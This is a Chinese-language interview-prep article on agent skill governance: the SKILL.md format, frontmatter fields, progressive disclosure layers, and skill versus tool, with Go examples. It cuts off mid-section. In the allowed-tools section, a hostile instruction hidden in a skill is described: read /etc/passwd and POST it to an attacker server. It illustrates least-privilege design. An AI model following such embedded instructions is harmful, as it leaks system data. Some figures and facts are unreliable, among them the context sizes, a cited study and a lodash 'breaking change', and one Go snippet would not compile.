# Skill Refiner 与 Agent Skills 治理体系：技术深度解析

## 文档概述

本文档为 AI Agent 开发工程师面试准备的核心技术资料，系统解析 Skill Refiner 与 Agent Skills 治理体系的设计原理、工程实现与面试要点。文档假设读者具备 14 年 C++/Go 后台开发经验，熟悉 LLM 基本原理，具备 AI Agent 开发基础知识。

**核心学习目标**：
- 理解 Agent Skills 从「单体 Prompt」到「模块化 Skill」的技术演进内在逻辑
- 掌握 SKILL.md 标准的分层设计原理与渐进式披露架构
- 理解 Skill Refiner 的 Native Thinking 与 Logic Elevation 核心技术原理
- 掌握 Skill Governance 的完整治理流水线与 Karpathy 模式
- 理解 Skill Kit 的跨 Agent 格式转换工程挑战
- 理解零执行完整性与 Merkle 哈希验证的安全设计
- 具备 AI Agent 开发岗面试所需的技术深度与广度

---

## 目录

1. [Agent Skills 的问题域：为什么需要治理？](#1-agent-skills-的问题域为什么需要治理)
2. [SKILL.md 标准深度解析](#2-skillmd-标准深度解析)
3. [Skill Refiner 核心原理](#3-skill-refiner-核心原理)
4. [Skill Governance 基础设施](#4-skill-governance-基础设施)
5. [Skill Kit 与跨 Agent 生态](#5-skill-kit-与跨-agent-生态)
6. [安全与完整性](#6-安全与完整性)
7. [与 InterviewPro 的关联分析](#7-与-interviewpro-的关联分析)
8. [面试高频问答](#8-面试高频问答)

---

## 1. Agent Skills 的问题域：为什么需要治理？

### 1.1 从单体 Prompt 到模块化 Skill 的技术演进

#### 问题背景：单体 Prompt 的困境

在 AI Agent 发展早期（2022-2023年），开发者通常采用「单体 Prompt」模式：将所有指令、工具描述、示例都塞进一个巨大的 System Prompt。这种做法在小规模实验中工作良好，但面临三个根本性问题：

**问题一：上下文长度硬限制**
当项目复杂度增加，Prompt 体积快速膨胀。以一个具备代码审查、测试生成、文档编写能力的 AI 编码助手为例：
- 系统指令：~2000 tokens
- 工具定义（10个工具）：~3000 tokens
- 项目上下文（100个源文件摘要）：~5000 tokens
- 业务规则与例外情况：~2000 tokens
- **总计：~12000 tokens**

Claude 3.5 Sonnet 的 128K 上下文看似充裕，但实际使用中存在两个问题：
1. **中间丢失效应（Lost in the Middle）**：研究表明 LLM 对长上下文中间部分的信息召回率显著低于首尾部分
2. **推理成本线性增长**：每 1K tokens 的输入约增加 0.3-1ms 延迟与 $0.0001 的计算成本

**问题二：知识耦合与版本僵化**
单体 Prompt 中，修改任何一小段指令都可能意外影响其他功能。缺乏模块化意味着：
- 无法单独测试某个功能模块
- 无法在多个 Agent 间复用功能单元
- 无法追踪某个改动的影响范围

**问题三：团队协作困难**
当多个开发者同时修改同一个 Prompt 文件时，缺乏结构化的变更管理机制。Git 对纯文本的 diff 在语义层面毫无帮助。

#### 模块化 Skill 的设计思想

Skill（技能）的核心思想借鉴了软件工程的模块化原则：**将复杂系统分解为高内聚、低耦合的功能单元**。

在 Agent 系统中，一个 Skill 代表一个完整的能力单元，包含：
- **意图定义**：这个 Skill 做什么？
- **触发条件**：何时应该调用这个 Skill？
- **执行逻辑**：如何执行这个能力？
- **资源依赖**：需要哪些外部文件、API、文档？
- **质量标准**：如何衡量执行结果？

**为什么 Skill 抽象比 Tool 更适合复杂任务？**

这里需要区分两个概念：Tool（工具）与 Skill（技能）。

| 维度 | Tool | Skill |
|------|------|-------|
| 粒度 | 原子操作（如 `read_file`、`bash`） | 复杂能力（多步流程+策略+决策） |
| 上下文 | 无状态，每次调用独立 | 有状态，维护执行上下文 |
| 组合性 | 需外部编排 | 内置可组合性 |
| 示例 | `curl GET https://api`, `SQL SELECT` | `代码审查 Skill`、`测试生成 Skill` |

**原理分析**：LLM 的规划能力有限，当面对复杂任务时，直接调用原子 Tool 需要 LLM 自己完成：
1. 任务拆解
2. 调用序列规划
3. 结果聚合
4. 异常处理

这相当于让 LLM 同时做「业务决策」和「执行调度」，消耗大量有限的上下文窗口给调度逻辑。Skill 通过预先封装这些调度逻辑，将 LLM 的认知资源集中于真正的业务决策。

#### 面试追问方向

**追问 1**：如果 LLM 上下文窗口足够大（比如 1M tokens），还需要 Skill 模块化吗？

**回答框架**：
```
这个问题涉及「上下文长度」与「模块化」的关系，我认为两者是正交的：

1. 上下文长度解决的是「能存多少信息」，模块化解决的是「信息如何组织」
2. 即使有 1M 上下文，模块化仍然必要：
   - 信息密度问题：上下文窗口大不等于信息都能被有效利用
   - 中间丢失效应仍然存在（Harvard 研究：即使 200K 上下文，模型对中间 25% 内容的召回率下降 50%+）
   - 维护性问题：单体 Prompt 即使能存，修改成本也极高
   - 可测试性：模块化才能做单元测试，单体 Prompt 只能做端到端测试
3. 类比：现代 CPU 有 TB 级内存空间，为什么还需要模块化的 DLL/so 动态库？
   答案相同：管理复杂度、支持复用、控制加载粒度
```

---

### 1.2 Skill 爆炸问题：安装几十个 Skills 后面临的挑战

#### 问题背景：Skills 的规模诅咒

随着 Agent 生态系统成熟，开发者面临的不是「没有 Skill 可用」，而是「Skill 太多难以管理」。

**量化分析：Skill 爆炸的规模效应**

假设一个典型开发者环境：
- 全局安装的公共 Skill：20 个（代码审查、测试生成、文档生成、部署、监控告警...）
- 项目级 Skill：10 个（业务特定规则、团队规范、项目上下文）
- 团队共享 Skill：5 个（代码风格、API 规范、CI/CD 配置）

总计 35 个 Skill。表面上看数量可控，但实际面临以下挑战：

**挑战一：可用性问题——技能发现与匹配**

当用户需要完成一个任务时，如何知道应该使用哪个 Skill？
- `git-commit` 场景：应该用「Conventional Commits Skill」还是「Semantic Release Skill」？
- 两个 Skill 都声称能生成规范 commit message，但它们遵守的规范不同
- 缺乏统一的 Skill 注册表和语义描述

**挑战二：过时性问题——Skill 腐烂**

Skills 依赖外部资源：
- 外部 API 变更（URL、认证方式、响应格式）
- 依赖的脚本文件路径变化
- 文档链接失效
- 引用的 reference 文件内容过时

以一个「代码审查 Skill」为例，它可能依赖：
```yaml
references:
  - path: ./style-guide.md  # 项目代码规范
  - path: ./api-docs.json   # 内部 API 文档
  - url: https://example.com/security-policy  # 安全政策
```

6 个月后：
- `style-guide.md` 已更新 3 个版本，当前内容与 Skill 假设不符
- `api-docs.json` 格式已变更，部分字段名已重构
- 安全政策 URL 返回 404

Skill 变成了「定时炸弹」，在某些场景下工作，在其他场景下产生错误结果。

**挑战三：冲突问题——多 Skill 相互干扰**

当多个 Skill 同时活跃时，可能产生意图冲突：

**场景示例**：
```
用户指令：「把这个函数重构一下，然后跑一下测试」

Skill A（代码重构）：识别到重构需求，准备执行
Skill B（测试执行）：识别到测试需求，准备执行
Skill C（文档生成）：检测到代码变更，触发自动文档更新

结果：三个 Skill 同时尝试操作同一批文件，产生竞争条件
```

**挑战四：不可观测性问题——黑盒执行**

传统 Skill 执行是黑盒：
- Skill 内部调用了哪些 Tool？
- 执行过程中消耗了多少上下文？
- Skill 的决策依据是什么？
- 执行时间分布在哪些阶段？

缺乏可观测性意味着：
1. 无法定位问题根因（Skill 执行失败？是哪一步出错？）
2. 无法优化性能（哪些 Skill 执行最慢？）
3. 无法评估质量（Skill A 生成的代码真的比 Skill B 好吗？）

#### 面试追问方向

**追问 1**：能否用传统的微服务治理经验来解决 Skill 爆炸问题？

**回答框架**：
```
这是一个很好的类比。微服务治理确实提供了一些可借鉴的思想，但 Skill 治理有其独特挑战：

相似之处：
1. 服务注册与发现 → Skill 注册表与发现机制
2. 服务版本控制 → Skill 版本管理与兼容性
3. 服务监控 → Skill 可观测性（trace、span、checkpoint）
4. 服务限流 → Skill 资源配额（token budget）

独特挑战（微服务没有的）：
1. LLM 非确定性：微服务的输入输出是确定性的，Skill 的输入输出依赖 LLM 推理，有随机性
2. 上下文污染：微服务间通过 API 传递结构化数据，Skill 间通过共享上下文传递半结构化文本
3. 组合爆炸：N 个微服务有 N*(N-1)/2 种调用组合；N 个 Skill 的组合方式还要考虑上下文继承，组合空间更大
4. 质量评估主观性：微服务可以精确测试响应时间、错误率；Skill 的「好」往往是主观的（代码风格优雅 vs 正确）

类比的边界：微服务治理可以借鉴，但 Skill 治理需要新的理论框架。
```

---

### 1.3 治理的必要性类比：npm 的启示

#### npm 生态的治理经验

npm（Node Package Manager）作为全球最大的 JavaScript 包管理器，经历了从「无序扩张」到「治理成熟」的过程。这个过程揭示了包管理器治理的核心要素：

**npm 治理体系的四大支柱**：

```
┌─────────────────────────────────────────────────────────────┐
│                      npm 治理体系                            │
├─────────────────────────────────────────────────────────────┤
│  1. 清单管理（package.json）                                  │
│     - 声明式依赖：明确声明需要哪些包、什么版本               │
│     - 解决「用了哪些包」的问题                                │
│                                                              │
│  2. 锁定机制（package-lock.json）                             │
│     - 确定性安装：固定每个包的具体版本、下载 URL、哈希        │
│     - 解决「版本一致性问题」                                  │
│                                                              │
│  3. 安全审计（npm audit）                                    │
│     - 已知漏洞扫描：CVE 数据库匹配                           │
│     - 依赖树分析：传递依赖的漏洞传播                          │
│     - 解决「安全问题」                                        │
│                                                              │
│  4. 语义版本（SemVer）                                        │
│     - 版本号规范：MAJOR.MINOR.PATCH                          │
│     - API 兼容性预期：^1.2.3 表示兼容 1.x.x                  │
│     - 解决「升级风险问题」                                    │
└─────────────────────────────────────────────────────────────┘
```

**为什么 npm 需要这些机制？**

假设没有 package.json：开发者需要手动记录「我的项目用了哪些包」，这显然不可行。

假设没有 package-lock.json：
```
开发者 A：`npm install lodash@4.17.20`（2021年3月安装）
开发者 B：`npm install lodash@latest`（2021年6月安装）

A 的 package.json：`"lodash": "^4.17.20"`
B 的 package.json：`"lodash": "^4.17.20"`（看起来一样）

但实际上 B 安装的是 4.17.21（包含一个 breaking change）

结果：A 能跑，B 报错。原因：^4.17.20 在语义版本中是「兼容 4.x.x」，但 4.17.21 恰好破坏了兼容性
```

#### Agent Skills 需要什么治理机制？

将 npm 的经验映射到 Agent Skills 领域：

| npm 机制 | 对应 Skill 需求 | 解决什么问题 |
|----------|----------------|-------------|
| package.json | SKILL.md Frontmatter | 声明 Skill 的元信息：名称、版本、依赖、适用场景 |
| package-lock.json | Skill Registry + Hash | 锁定 Skill 的完整内容快照，防止运行时内容被篡改 |
| npm audit | skill-audit 命令 | 扫描 Skill 的已知问题：过时引用、token 超限、冲突依赖 |
| SemVer | 渐进版本策略 | Skill 升级的兼容性保证 |
| npm publish | Marketplace 发布 | Skill 的分发与发现 |
| npm install | install-agent-skill | Skill 的安装与同步 |

**Skills 治理的独特挑战（npm 没有的）**：

1. **内容语义验证**：npm 包是编译好的二进制，内容不会变；Skill 是文本内容，可能被 LLM 动态修改
2. **执行上下文依赖**：npm 包运行在隔离环境；Skill 运行在共享的 LLM 上下文中
3. **质量主观性**：npm 包有明确的 API 和测试用例；Skill 的「质量」往往是语义层面的

---

## 2. SKILL.md 标准深度解析

### 2.1 为什么需要统一标准？没有标准会怎样？

#### 问题背景：Skill 格式的巴别塔

在 SKILL.md 标准出现之前（2024年之前），每个 Agent 平台都有自己的 Skill 定义格式：

**各平台的 Skill 定义格式对比**：

```yaml
# Claude Code 的 Skill 格式
{
  "name": "code-review",
  "description": "Performs code review",
  "instructions": "...",
  "tools": ["Read", "Bash"]
}

# Cursor 的 Skill 格式  
.mdc 文件格式：
---
skill:
  name: code-review
---

# 指令内容
...

# Windsurf 的 Skill 格式
# .windsurfrules 文件
- rule: "代码审查规则"
  description: "..."
  glob: "**/*.py"
  always_apply: false
```

**没有统一标准的后果**：

**后果一：Skill 无法跨平台复用**
```
场景：你在 Claude Code 上开发了一个优秀的「代码审查 Skill」
想要在 Cursor 中使用

问题：
1. 文件格式不兼容（.json vs .mdc）
2. 字段语义不同（Cursor 没有 `instructions` 字段）
3. 触发机制不同（Claude 用意图匹配，Cursor 用文件 glob）

结果：必须重写 Skill，无法复用
```

**后果二：Skill 市场碎片化**
```
现象：GitHub 上有 1000 个「代码审查 Prompt」，但格式各异
想要找到适合自己平台的 Skill，需要：
1. 逐个查看每个 Prompt 的格式
2. 手动转换为自己平台的格式
3. 测试转换后的效果

成本：搜索 10 分钟 + 转换 30 分钟 + 测试 20 分钟 = 1 小时/个 Skill
```

**后果三：Skill 质量无法评估**
```
没有统一标准意味着没有统一的评估维度：
- A 平台用「星标数」评估
- B 平台用「下载量」评估
- C 平台用「社区投票」评估

但这些指标都不能真正反映 Skill 的：
- 准确性：Skill 执行的指令是否正确？
- 完整性：Skill 是否覆盖了所有必要场景？
- 可维护性：Skill 是否易于更新和扩展？
```

#### SKILL.md 标准的诞生

SKILL.md 标准的核心思想是：**Skill 应该是一个自描述的、与平台无关的能力单元**。

**设计原则**：

1. **人类可读优先**：Skill 的核心内容是 Markdown 文本，人类可以直接阅读和编辑
2. **机器可解析其次**：Frontmatter 部分用 YAML/JSON 提供结构化元信息
3. **平台无关**：不依赖任何特定 Agent 平台的实现细节
4. **最小化约束**：只规定必要的元信息字段，保留最大灵活性

**为什么选择 Markdown 作为主格式？**

这个选择有其深刻的工程原理：

```
可读性优先：Markdown 是纯文本，任何编辑器都能打开
Git 友好：Markdown 文件的 diff 有语义（能看到具体改了哪句话）
LLM 友好：LLM 训练数据中 Markdown 占比高，对 Markdown 格式的指令理解更好
格式迁移简单：Markdown → HTML/PDF/Word 都有成熟工具
```

**类比**：如同 Go 项目选择 `go.mod` 作为依赖声明格式（纯文本 + 简单语法），而非 XML 或二进制格式。

#### 面试追问方向

**追问 1**：SKILL.md 和传统的 API 规范（如 OpenAPI/Swagger）有什么本质区别？

**回答框架**：
```
这个问题触及了「声明式规范」vs「过程式规范」的核心区别：

OpenAPI 规范：描述「如何调用」
- 定义 HTTP endpoint、参数、返回值
- 机器可执行：可以自动生成客户端代码
- 确定性：给定相同输入，必然产生相同输出

SKILL.md：描述「如何思考」
- 定义意图、策略、决策边界
- 指导 LLM 的推理过程，而非直接执行
- 非确定性：相同 Skill 可能产生不同质量的输出

本质区别：
| 维度 | OpenAPI | SKILL.md |
|------|---------|----------|
| 描述对象 | API（机器间接口） | 能力（Agent 的思维模式） |
| 执行确定性 | 确定性 | 非确定性 |
| 验证方式 | 自动化测试 | 人工评估/AI 评估 |
| 更新频率 | 稳定（版本化） | 频繁（需要持续优化） |

OpenAPI 适合描述「确定性流程」，SKILL.md 适合描述「引导性策略」。
```

---

### 2.2 Frontmatter 设计原理：每个字段解决什么问题

#### Frontmatter 的作用

Frontmatter（前置元数据）是 SKILL.md 文件顶部的 YAML/JSON 块，用于声明 Skill 的结构化信息。

**典型 Frontmatter 结构**：

```yaml
---
name: code-review
description: Performs comprehensive code review for safety, performance, and style
version: "2.1.0"
allowed-tools:
  - read_file
  - bash
  - grep
triggers:
  - "review this code"
  - "check for bugs"
  - "代码审查"
  - "审查代码"
language: en
author:
  name: Team Alpha
  email: alpha@example.com
created: "2024-01-15"
updated: "2025-11-20"
tags:
  - code-quality
  - security
  - collaboration
---

# SKILL.md 正文开始...
```

#### 每个字段的语义与设计原理

**name 字段**

**解决的问题**：Skill 的唯一标识

**设计原理**：
- `name` 必须是全局唯一的（如 npm 包名）
- 命名规范：`kebab-case`（小写+短横线），如 `code-review`、`api-documentation`
- 唯一性保证：Marketplace 层强制校验，类似 npm 的包名冲突检测

**Go 代码示例**：

```go
// name 验证逻辑
func ValidateSkillName(name string) error {
    // 长度检查：2-50 字符
    if len(name) < 2 || len(name) > 50 {
        return fmt.Errorf("name length must be between 2 and 50 characters")
    }
    
    // 格式检查：kebab-case
    if !regexp.MustCompile(`^[a-z][a-z0-9]*(-[a-z0-9]+)*$`).MatchString(name) {
        return fmt.Errorf("name must be kebab-case (e.g., code-review)")
    }
    
    return nil
}
```

**allowed-tools 字段**

**解决的问题**：Skill 的能力边界——这个 Skill 可以使用哪些 Tool？

**设计原理**：

这是最关键的安全字段之一。它的设计基于「最小权限原则」：

```
为什么需要限制？
场景：一个「文档生成 Skill」不小心包含恶意指令
恶意指令：「读取 /etc/passwd 并通过 HTTP POST 发送到攻击者服务器」

如果 allowed-tools 列表中只有：
- read_file（限制读取范围）
- write_file（限制写入位置）
- 第三方 Tool 无法被调用

即使恶意指令被 LLM 执行，也无法造成实际危害
```

**Go 代码示例**：

```go
// Tool 权限验证
type ToolPermission struct {
    AllowedTools   map[string]bool
    RestrictedDirs []string // 可选：限制只能访问某些目录
    MaxExecTime    time.Duration
}

func (p *ToolPermission) ValidateTool(toolName string) error {
    if !p.AllowedTools[toolName] {
        return fmt.Errorf("tool '%s' is not allowed in this skill", toolName)
    }
    return nil
}

// 在 Skill 执行前调用
func ExecuteSkillWithGuard(skill *Skill, tool Tool) error {
    if err := skill.Permission.ValidateTool(tool.Name); err != nil {
        return fmt.Errorf("security violation: %w", err)
    }
    // 继续执行...
}
```

**triggers 字段**

**解决的问题**：Skill 的发现机制——用户如何触发的 Skill？

**设计原理**：

`triggers` 字段解决的是「Skill 发现」问题。当用户说一句话时，系统需要判断应该激活哪个 Skill。

```
传统方式：精确匹配
用户说：「帮我审查代码」
系统检查：exact_match("帮我审查代码", triggers) → false

问题：用户不会每次都用完全相同的措辞

解决方案：语义相似度匹配
用户说：「帮我审查代码」
系统检查：
- embedding("帮我审查代码") vs embedding("代码审查")
- cosine_similarity > 0.8 → 触发
```

**triggers 的设计权衡**：

| 方案 | 优点 | 缺点 |
|------|------|------|
| 精确关键词 | 简单、确定 | 无法处理同义词、变体 |
| 语义向量 | 支持同义词、灵活 | 需要 embedding 服务、有误触发风险 |
| LLM 判断 | 最智能 | 慢、成本高、有随机性 |

SKILL.md 采用「声明式触发词」方案，由下游 Agent 平台决定使用哪种匹配策略。

**version 字段**

**解决的问题**：Skill 的版本管理

**设计原理**：

SemVer（语义化版本）的核心思想：通过版本号传达兼容性信息。

```
版本格式：MAJOR.MINOR.PATCH

- MAJOR：不兼容的 API 变更
- MINOR：向后兼容的功能新增
- PATCH：向后兼容的问题修复

示例：
v1.2.3 → v2.0.0：breaking change，需要显式升级
v1.2.3 → v1.3.0：新增功能，可安全升级
v1.2.3 → v1.2.4：Bug 修复，可安全升级
```

**Go 代码示例**：

```go
// SemVer 解析与比较
type SemVer struct {
    Major, Minor, Patch int
}

func ParseVersion(v string) (*SemVer, error) {
    parts := strings.Split(v, ".")
    if len(parts) != 3 {
        return nil, fmt.Errorf("invalid semver: %s", v)
    }
    var sv SemVer
    for i, p := range parts {
        n, err := strconv.Atoi(p)
        if err != nil {
            return nil, fmt.Errorf("invalid semver component: %s", p)
        }
        switch i {
        case 0:
            sv.Major = n
        case 1:
            sv.Minor = n
        case 2:
            sv.Patch = n
        }
    }
    return &sv, nil
}

func (v *SemVer) IsCompatible(other *SemVer, constraint string) bool {
    // ^1.2.3 → 兼容 1.x.x
    // ~1.2.3 → 兼容 1.2.x
    // >=1.0.0 → 最低版本要求
    // 简化实现
    switch constraint[0] {
    case '^':
        return v.Major == other.Major
    case '~':
        return v.Major == other.Major && v.Minor == other.Minor
    }
    return false
}
```

#### 面试追问方向

**追问 1**：Frontmatter 可以完全用 JSON Schema 替代吗？有什么优劣？

**回答框架**：
```
这是「声明式格式」的选择问题，JSON Schema vs YAML Frontmatter 各有适用场景：

JSON Schema 的优势：
1. 严格的类型校验：可定义字段类型、枚举、正则约束
2. 自动化验证工具成熟：很多语言的 JSON Schema 库
3. IDE 支持好：自动补全、错误提示

YAML Frontmatter 的优势：
1. 与 Markdown 正文天然整合：同一个文件包含元数据和内容
2. 人类可读性更好：YAML 的树形结构比 JSON 的括号更直观
3. 注释支持：可以在 Frontmatter 中加注释说明字段用途

选择 Frontmatter 的核心理由：
- Skill 的核心价值在于「人类可读的指令」，Markdown 是最好的载体
- 将元数据放在正文之外，用 Frontmatter 分隔，保持正文纯净
- 如果用 JSON Schema，元数据和正文混在一起，降低可读性

最佳实践：
- Frontmatter：声明元数据（name、version、triggers）
- 正文：人类可读的指令内容
- 分离的好处：元数据供机器解析，正文供人类阅读
```

---

### 2.3 渐进式披露架构原理：为什么要分 L1/L2/L3？

#### 问题背景：上下文窗口的有限性

LLM 的上下文窗口是有限的，即使是最先进的模型（Claude 3.5 128K、GPT-4 Turbo 128K），也有实际使用的限制：

```
实际限制分析：

1. 理论 vs 实际：
   - Claude 3.5 理论：128K tokens
   - 实际可用：约 100K tokens（留 20%+ 给输出和系统 Prompt）
   - 再考虑中间丢失效应：真正「可靠」的有效上下文约 50-60K

2. 成本考量：
   - 输入成本：$3/1M tokens（Claude 3.5 Sonnet）
   - 100K tokens → $0.30/次
   - 1 个用户会话 10 次交互 → $3/会话
   - 1000 个日活用户 → $3000/天

3. 延迟考量：
   - 100K tokens 输入 → 约 2-3 秒 P99 延迟
   - 用户对 AI 响应延迟容忍度：<3 秒
   - 超过 100K tokens 的输入会显著影响体验
```

#### 渐进式披露的三层架构

Skill Governance 引入了「渐进式披露」（Progressive Disclosure）架构，将 Skill 内容分为三层：

```
┌─────────────────────────────────────────────────────────────┐
│                  渐进式披露架构                              │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  L1: SKILL.md（始终活跃）                                    │
│  ┌─────────────────────────────────────────────────────┐    │
│  │ • Frontmatter：~100 tokens                           │    │
│  │ • 核心指令：< 5000 tokens                            │    │
│  │ • 始终加载到上下文                                 │    │
│  │ • 用途：Skill 的「名片」和「使用说明」              │    │
│  └─────────────────────────────────────────────────────┘    │
│                         ↓ 按需加载                            │
│  L2: doctrines/（上下文敏感）                                │
│  ┌─────────────────────────────────────────────────────┐    │
│  │ • 教义/原则文件：< 3000 tokens/个                   │    │
│  │ • 只在特定场景下加载                               │    │
│  │ • 用途：领域特定规则（如 Python 风格指南）         │    │
│  └─────────────────────────────────────────────────────┘    │
│                         ↓ 按需加载                            │
│  L3: references/（按需加载）                                │
│  ┌─────────────────────────────────────────────────────┐    │
│  │ • 参考文档：可能很大（10K+ tokens）                 │    │
│  │ • 只在明确引用时加载                                │    │
│  │ • 用途：API 文档、代码规范、外部知识库             │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

#### 每层的设计原理

**L1: SKILL.md（始终活跃层）**

**解决的问题**：快速判断 Skill 是否适用

**设计原理**：

L1 层的设计目标是「最小可用信息」。当 Agent 决定是否激活某个 Skill 时，只需要 L1 的信息：

```
判断逻辑：
if (user_intent matches skill.triggers) and (allowed_tools includes required_tools) then
    activate_skill(skill)
```

Frontmatter 中的 `triggers` 字段专门为此设计：Agent 只需要读取 Frontmatter（~100 tokens）就能判断是否应该激活 Skill，而不需要读取完整的 SKILL.md 正文。

**token 预算约束**：
- Frontmatter + 核心指令：< 5000 tokens
- 这是经过实践验证的「单次可读完且不会遗忘」的信息量
- 超过 5K tokens 的内容，人类难以一次性理解，LLM 的召回率也会下降

**L2: doctrines/（上下文敏感层）**

**解决的问题**：处理 Skill 的领域变体

**设计原理**：

「教义」（Doctrine）这个词暗示了它的用途：是一套原则性指导，但不是铁律，需要根据上下文判断是否适用。

**示例场景**：

```yaml
# Skill: 代码重构
# L1: SKILL.md
name: code-refactor
triggers:
  - "重构这段代码"
  - "优化性能"
  
# L2: doctrines/
# 目录结构：
# doctrines/
#   ├── python-style.md      # Python 特定重构原则
#   ├── go-concurrency.md    # Go 并发特定重构原则
#   ├── security-first.md    # 安全优先场景的重构原则
#   └── performance.md       # 性能优先场景的重构原则

# L3: references/
#   ├── python-idioms.json   # Python 惯用法参考（可能很大）
#   └── go-patterns.md       # Go 设计模式参考（可能很大）
```

**加载决策逻辑**：

```go
// L2 加载决策
type DoctrineLoader struct {
    currentLanguage    string
    currentFramework   string
    performanceMode    bool
    securityMode       bool
}

func (d *DoctrineLoader) GetApplicableDoctrines(skill *Skill) []string {
    var applicable []string
    
    for _, doc := range skill.Doctrines {
        if d.shouldLoad(doc) {
            applicable = append(applicable, doc.Path)
        }
    }
    
    return applicable
}

func (d *DoctrineLoader) shouldLoad(doc Doctrine) bool {
    // 上下文敏感加载
    switch doc.Type {
    case "language-specific":
        return doc.Language == d.currentLanguage
    case "framework-specific":
        return doc.Framework == d.currentFramework
    case "mode-specific":
        return doc.Mode == d.getCurrentMode()
    default:
        return false
    }
}
```

**为什么 L2 是必要的？**

假设没有 L2：

```
方案 A：把所有规则塞进 SKILL.md
问题：
- SKILL.md 膨胀到 50K tokens
- Python 开发者加载了 Go 相关的规则（无用信息，浪费上下文）
- JavaScript 开发者加载了 Rust 相关的规则

方案 B：拆成多个 Skill
问题：
- 「Python 代码重构 Skill」和「Go 代码重构 Skill」有 80% 重复内容
- 维护成本倍增
- 升级时要改 N 个文件

方案 C：L2 渐进式披露（采用）
- SKILL.md 保留通用重构逻辑
- doctrines/python-style.md 只在检测到 Python 项目时加载
- 复用率最大化，维护成本最小化
```

**L3: references/（按需加载层）**

**解决的问题**：存储大量但不常用的参考信息

**设计原理**：

L3 解决的是「参考信息」的存储问题。参考文档通常：
- 内容量大（10K-100K tokens）
- 不需要全部加载（可能只引用其中一小段）
- 更新频繁（API 文档、第三方库变更）

**示例**：

```yaml
# references/
# ├── api-docs/
# │   ├── openapi.json          # 内部 API 规范（可能 50K+ tokens）
# │   └── graphql-schema.md     # GraphQL Schema
# ├── external/
# │   ├── python-stdlib.md      # Python 标准库参考
# │   └── go-standard-lib.md    # Go 标准库参考
# └── project/
#     ├── architecture.md        # 项目架构文档
#     └── decisions/             # ADR（架构决策记录）
#         ├── 001-database-choice.md
#         └── 002-caching-strategy.md
```

**按需加载的实现**：

```go
// L3 按需加载
type ReferenceLoader struct {
    references map[string]*ReferenceDoc
    cache      *lru.Cache // LRU 缓存，避免重复加载
}

type ReferenceDoc struct {
    Path    string
    Content string
    Index   *InvertedIndex // 倒排索引，支持快速定位
}

func (r *ReferenceLoader) LoadReference(skill *Skill, query string) (*ReferenceDoc, error) {
    // 1. 解析 query 中的引用标记
    ref := r.parseReference(query) // 例如：@ref:api-docs/openapi.json#/paths/users
    
    // 2. 检查缓存
    if cached, ok := r.cache.Get(ref.Path); ok {
        return cached.(*ReferenceDoc), nil
    }
    
    // 3. 懒加载：只加载被引用的文件
    content, err := r.loadFile(ref.Path)
    if err != nil {
        return nil, fmt.Errorf("failed to load reference: %w", err)
    }
    
    // 4. 如果是 JSON，支持 JSONPath 提取
    if strings.HasSuffix(ref.Path, ".json") && ref.JSONPath != "" {
        content = r.extractJSONPath(content, ref.JSONPath)
    }
    
    doc := &ReferenceDoc{
        Path:    ref.Path,
        Content: content,
    }
    
    r.cache.Add(ref.Path, doc)
    return doc, nil
}
```

#### 面试追问方向

**追问 1**：渐进式披露和 RAG（Retrieval-Augmented Generation）有什么本质区别？

**回答框架**：
```
这是一个非常好的问题，两者都涉及「信息检索」，但解决的问题不同：

RAG 的核心场景：
- 用户问：「最新的产品定价是多少？」
- 系统需要从实时文档中检索答案
- 关键词：实时性、开放域、向量检索

渐进式披露的核心场景：
- Agent 执行任务时需要规则指导
- 规则是预先定义的、结构化的
- 关键词：分层管理、按需加载、结构化

技术对比：
| 维度 | RAG | 渐进式披露 |
|------|-----|-----------|
| 数据来源 | 外部知识库（动态） | Skill 内部（静态） |
| 检索时机 | 每次用户请求 | Skill 激活时预加载 |
| 检索方式 | 向量相似度 | 精确路径匹配 |
| 更新频率 | 高（实时文档） | 低（版本化） |
| 典型场景 | 问答、知识查询 | 任务执行指导 |

联系：
- L3 references 的按需加载可以借鉴 RAG 的思想
- 但 RAG 的向量检索对于 Skill 内部结构过于复杂
- Skill 更强调「结构化管理」而非「开放域检索」

类比：
- 渐进式披露：图书馆的分层分类系统（按楼层、按区域、按书架）
- RAG：Google 搜索（用户问什么，就从全网找什么）
```

---

### 2.4 Skill vs Tool 的本质区别

#### 问题背景：为什么不能只用 Tool？

很多开发者在接触 Agent 时会有一个疑问：**既然 Tool 可以完成具体操作，为什么还需要 Skill？**

要回答这个问题，需要深入理解 Skill 和 Tool 的本质区别。

#### 概念对比

```
Tool（工具）：
- 原子操作，不可再分
- 输入 → 确定性输出
- 示例：read_file、bash、HTTP GET

Skill（技能）：
- 复合能力，多个步骤组合
- 指令 → 非确定性输出（依赖 LLM 推理）
- 示例：代码审查、测试生成、部署流程
```

#### 本质区别一：执行模式

**Tool 是「执行」，Skill 是「指导执行」**

```
Tool 执行流程：
User → "读取 /path/to/file" → Tool(read_file) → 返回文件内容
                   ↓
              确定性操作

Skill 执行流程：
User → "帮我审查这段代码" → Skill(代码审查)
                            ├→ Tool(read_file)：读取代码
                            ├→ 分析代码结构（LLM 推理）
                            ├→ Tool(bash)：运行 linter
                            ├→ Tool(search)：查阅代码规范
                            ├→ 综合判断（LLM 推理）
                            └→ 返回审查报告
                   ↓
              非确定性操作
```

#### 本质区别二：上下文依赖

**Tool 无状态，Skill 有状态**

```go
// Tool 的无状态性
// 每次调用独立，不依赖之前的状态
type ReadFileTool struct{}

func (t *ReadFileTool) Execute(ctx context.Context, path string) (string, error) {
    // 纯粹的读取操作
    // 不保留任何状态
    // 相同的 path 总是返回相同的内容
    return os.ReadFile(path)
}

// Skill 的有状态性
// 维护执行上下文
type CodeReviewSkill struct {
    ctx       context.Context
    reviewed  map[string]bool      // 已审查的文件
    findings  []ReviewFinding      // 发现的问题
    decisions []ReviewDecision     // 作出的决策
}

func (s *CodeReviewSkill) Execute(codePath string) (*ReviewReport, error) {
    // 1. 检查是否已审查（状态依赖）
    if s.reviewed[codePath] {
        return nil, fmt.Errorf("already reviewed: %s", codePath)
    }
    
    // 2. 读取代码
    code, _ := s.tools.ReadFile(codePath)
    
    // 3. 分析（依赖之前审查的文件，理解上下文）
    context := s.getContext(s.reviewed) // 依赖状态
    analysis := s.analyze(code, context) // 状态影响分析
    
    // 4. 更新状态
    s.reviewed[codePath] = true
    s.findings = append(s.findings, analysis.Findings...)
    
    return &ReviewReport{analysis}, nil
}
```

#### 本质区别三：决策能力

**Tool 不做决策，Skill 包含策略**

```
Tool 的边界：
「读取文件」
├→ 输入：文件路径
├→ 输出：文件内容
